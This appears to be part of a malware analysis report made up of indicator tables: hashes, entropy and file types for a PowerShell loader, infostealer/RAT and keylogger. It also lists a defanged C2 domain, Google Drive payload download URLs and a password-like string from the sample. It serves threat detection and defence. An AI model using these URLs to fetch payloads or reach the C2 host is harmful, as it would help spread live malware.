| `pipe.zip` | 15,431 bytes | ZIP archive | `427E98230CE245D6E78B20E52C253D86` | `9E846A12DF1DCB1DF90A4EE0B1BF70E70029DA5A` | `107B5AA3C4EF30B9B832E0A10B1EFB1DCF433158BC6AF8D890D66C0C9ED50D21` |
| `1.ps1` | 183 bytes | PowerShell loader | `6E700FA68B1A4DCE7836CDEB2F7505C3` | `ADCF29C4ABBC25ED7B16BE49F5FBE60C6D9DD8BC` | `3C7A0904C80ECB0F28F89453F4BFBE09AECDDA646FE9BCEB154670E92F51A95E` |
| `1.log` | 40,124 bytes | Base64 PowerShell payload | `CEF6E4DE9478C5D1A73A6ACCAD5BACF6` | `A89FFB58E64F3AAD3BAB37E6720F04B48B6135B3` | `7C9DAE29CEC1A63EE3FE9EDA38246FE8590BCC1795DFE31C903A0E40A87A6EDB` |
| `2.log` | 5,428 bytes | Base64 PowerShell keylogger payload | `424AC088A7E7841E0C11A599687875F6` | `03CC84389807B88595512C3B7EFFD91723E7FAB9` | `ED3CE0D3307446B23AA7CCDB977A4648DB1CB64BD9305BAE20061B59F97177B2` |
| `decoded_1.ps1` | 30,092 bytes | PowerShell infostealer/RAT | `7AACF7C8DE3CE72A73EE32B75ABBBE3F` | `54418A7781BF3B551671591630F0CE6F9310E95D` | `792BBC7DE30F6FC04FEFCD7752D85119BE309BFF732C0B68E0EAD2979890D513` |
| `decoded_2.ps1` | 4,070 bytes | PowerShell keylogger | `314581F4B2D702860E1882E7FD8F11F0` | `B806A43E899DAF7A2D274F4F9801E331B18D1CA2` | `BF5FCDEF5AC77400EF3A69C87BB699B3B9311E9B54BCE9841A753CD2A186132F` |

Entropy:

| Artifact | Entropy | Assessment |
| --- | --- | --- |
| `password.txt` | 4.1066 | Plaintext token/password-like string: `kfgxl;Y859$#KG4fkdl^&`. |
| `user.txt` | 7.1710 | Opaque high-entropy blob; not decrypted by the observed `pwko.vba` logic. |
| `sys.log` | 7.9990 | AES ciphertext for `sys.dll`. |
| `pipe.log` | 7.9876 | AES ciphertext for `pipe.zip`. |

#### File Identification

| Filename | File Size | Architecture | MD5 | SHA-1 | SHA-256 | Compilation Timestamp |
| --- | --- | --- | --- | --- | --- | --- |
| `pserver.log` | 32 bytes | AES ciphertext | `EB68BC8C79E55048E8EE4FD22C1B3471` | `3CB74DAD2951AF0944691C022A06469B441A6F8A` | `73BCFE9209ED2BC8CE817319091C53F68DFD892B67BC77B4012CC35B09174719` | N/A |
| `pserver.txt` | 28 bytes | Plaintext C2 URL | `6EBB3C7091FF33761A29581DCEF27900` | `DD87C252D4A54867DDBF06578C3ED0419515528A` | `1F045B010F9A554DCA4670E7165354CDD3C4F5B086C1C667760F73A3FFFBF667` | N/A |
| `appload.log` | 182,288 bytes | AES ciphertext | `96EC0C480E13D91F3CB693487E0B11CE` | `BCCF16DEB26F6DB0FAC1F05F61BD0BD59112A057` | `10781A32A608150E81108FB56469B836894435C0516A03628E9F62D950CBB37F` | N/A |
| `appload.dll` | 182,272 bytes | PE32+ DLL, x64 | `D1FD32DB51C6927066A15668A3670693` | `87FFD59B37BA300C7CD398CA1277071F0FF868F4` | `943E3D0534EB4EE6401CDD060BC35EDA394757457F1F1BBC5542D93C5901B4D1` | `2026-05-07 04:43:29 UTC` |

#### Additional Network IoCs

| Type | Indicator | Context |
| --- | --- | --- |
| URL | `hxxps://lutkdd[.]corpsecs[.]com/` | Decrypted C2 base URL from `pserver.log`. |
| Domain | `lutkdd.corpsecs.com` | C2 host used by `decoded_1.ps1` polling/upload protocol. |
| URL | `hxxps://drive.google[.]com/uc?export=download&id=1FA9TvcakCgfeRdLaejIJbeoFjuI9GB6R` | Encrypted C2 bootstrap ( `pserver.log`). |
| URL | `hxxps://drive.google[.]com/uc?export=download&id=15Xkvt3TwCQJERcUHSUandCigMVVxsFqr` | Encrypted app-key plugin ( `appload.log`). |
| URL | `hxxps://drive.google[.]com/uc?export=download&id=1EkyeoSdhvGqcEpZkqBUzXnJYPLka7zJc` | Embedded in `appload.dll`; likely auxiliary plugin/payload. |
| URL | `hxxps://drive.google[.]com/uc?export=download&id=1rqN7zYXO0jNSsZy8gSECxSxY57T0T_xr` | Embedded in `appload.dll`; likely auxiliary plugin/payload. |
| URL | `hxxps://drive.google[.]com/uc?export=download&id=176jQJH3H3DHPzjFI-tIjrV8KLtEBgY_m` | Embedded in `appload.dll`; likely auxiliary plugin/payload. |

#### File Identification

| Filename | File Size | Architecture | MD5 | SHA-1 | SHA-256 | Compilation Timestamp |
| --- | --- | --- | --- | --- | --- | --- |
| `app64.log` | 318,992 bytes | Unknown encrypted/packed blob | `7F38442308BB2AD43EFE0671873E179F` | `2E23F1E6E340C2DBC93E48FE63E86BA08AC14154` | `F58B089C8BB8DE31CE9887A6B700B0106259C29156BED56EC5CCE1B7E2128BBD` | N/A |
| `agent.log` | 3,484,320 bytes | Unknown encrypted/packed blob | `40ED8082923988BA08128A21E45674F6` | `26158CF59C85EDCB1EE5EDFCCFAEDC4609B6CFF5` | `FBBF6C23BB48E0F178C5097483B92459C9288E9B08E9733FE6F31E861FB43BFF` | N/A |
| `msh.log` | 35,963 bytes | Unknown encrypted/packed blob | `9AAB6CF2119E3E8D8F7C0A11E130E136` | `D90D5B197ECC37D0B91A695D72D51ADE4E5E200E` | `802E8519A279FE9637D66F225FBE8B6B02055156C8F5EA3275922966BB734F18` | N/A |

Entropy and leading bytes:

| Artifact | Entropy | First 16 Bytes |
| --- | --- | --- |
| `app64.log` | 7.9994 | `C1 49 21 C6 41 5E C1 71 A8 1F A9 F4 D7 8D 4C BA` |
| `agent.log` | 8.0000 | `28 07 EE 44 7F A2 16 0F 00 57 E7 4A 9D EF F0 8A` |
| `msh.log` | 7.9954 | `76 A4 EE B5 25 32 54 03 9E 0D 63 C2 3F C3 6B AC` |

#### Additional Network IoCs

| Type | Indicator | Context |
| --- | --- | --- |
| URL | `hxxps://drive.google[.]com/uc?export=download&id=1EkyeoSdhvGqcEpZkqBUzXnJYPLka7zJc` | Auxiliary blob `app64.log`; embedded in `appload.dll`. |
| URL | `hxxps://drive.usercontent.google[.]com/download?id=1rqN7zYXO0jNSsZy8gSECxSxY57T0T_xr` | Auxiliary blob `agent.log`; functionally same ID as embedded Google Drive URL. |
| URL | `hxxps://drive.google[.]com/uc?export=download&id=176jQJH3H3DHPzjFI-tIjrV8KLtEBgY_m` | Auxiliary blob `msh.log`; embedded in `appload.dll`. |

